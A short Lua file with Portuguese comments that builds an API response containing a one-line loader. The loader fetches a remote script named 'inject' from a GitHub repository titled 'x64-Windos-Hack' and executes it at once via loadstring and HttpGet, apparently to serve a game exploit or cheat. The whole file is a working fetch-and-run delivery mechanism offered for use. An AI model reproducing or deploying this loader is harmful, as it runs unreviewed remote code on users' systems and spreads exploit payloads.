-- api.lua
-- Script que gera a string pra resposta da API

local script_lua = [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/SrDark222/x64-Windos-Hack/refs/heads/main/inject"))()
]]

-- Função pra escapar caracteres especiais na string
local function escape_str(s)
    return s:gsub("\\", "\\\\"):gsub("\"", "\\\""):gsub("\n", "\\n")
end

-- Monta o return com a string escapada
local res = 'return "' .. escape_str(script_lua) .. '"'

print(res) -- só pra debug, pode tirar depois

return res
